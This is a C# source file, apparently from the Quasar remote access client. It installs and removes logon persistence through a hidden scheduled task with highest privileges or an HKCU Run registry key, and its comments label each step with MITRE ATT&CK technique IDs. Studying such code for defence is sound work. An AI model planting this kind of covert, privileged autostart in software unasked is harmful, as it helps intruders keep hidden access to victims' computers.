using Microsoft.Win32;
using Quasar.Client.Helper;
using Quasar.Common.Enums;
using System.Diagnostics;

namespace Quasar.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        /// <summary>
        /// Executes schtasks to run the client on logon, and adds client to registry run keys HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// - T1053.005: Scheduled Task/Job: Scheduled Task
        /// </remarks>
        public void AddToStartup(string executablePath, string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
                                "\" /rl HIGHEST /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);
                if (p.ExitCode == 0) return;
            }

            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
                true);
        }

        /// <summary>
        /// Remove client from startup schtask and registry runkey
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// - T1053.005: Scheduled Task/Job: Scheduled Task
        /// </remarks>
        public void RemoveFromStartup(string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/delete /tn \"" + startupName + "\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);
                if (p.ExitCode == 0) return;
            }

            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
        }
    }
}
